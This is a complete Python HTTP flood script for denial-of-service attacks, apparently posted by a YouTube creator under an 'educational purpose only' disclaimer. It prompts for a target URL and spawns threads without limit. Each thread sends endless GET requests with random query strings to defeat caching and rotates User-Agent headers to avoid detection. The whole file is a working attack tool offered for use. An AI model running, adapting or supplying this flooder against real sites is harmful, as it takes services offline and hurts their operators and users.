import os
import sys
import requests
import threading
import random


########################################
# Educational purpose only             #
########################################
# I'm not responsible for your actions #
########################################

"""
Created By: TheTechHacker
--------------------------------------------------
This Tool is for Educational purpose only             
I'm not responsible for your actions 


SUBSCRIBE: https://www.youtube.com/channel/UCKAmv8p_TRvUNrJlfiB8qBQ
"""


if sys.platform == "linux" or sys.platform == "linux2":
    os.system("clear")
elif sys.platform == "win32":
    os.system("cls")


print ("\033[1;32m")
url = input("          URL:  ").strip()
print ("\033[1;m")

count = 0
headers = []

def useragent():
    global headers
    headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
    headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")

    return headers


def ascii(size):
    out_str = ''

    for e in range(0, size):
        code = random.randint(65, 90)
        out_str += chr(code)
    
    return out_str


class httpth1(threading.Thread):
    def run(self):
        global count

        while True:
            try:

                urls = url + "?" + ascii(random.randint(3, 10))
                header = {"User-Agent": random.choice(useragent())}
                req = requests.request("GET", urls, headers=header)
                count += 1
                print ("{0} Pure Dos Send".format(count))
            except ValueError:
                print ("\033[1;34m [-]Check You're URL \033[1;m")
                sys.exit()
            except KeyboardInterrupt:
                exit("\033[1;34m [-]Canceled By User \033[1;m")
                break
                sys.exit()
            
            except Exception as error:
                print("\033[1;32m {0} \033[1;m".format(error))


while True:
    try:
        th1 = httpth1()
        th1.start()
    except Exception:
        pass
    except KeyboardInterrupt:
        exit("\033[1;34m [-]Canceled By User \033[1;m")
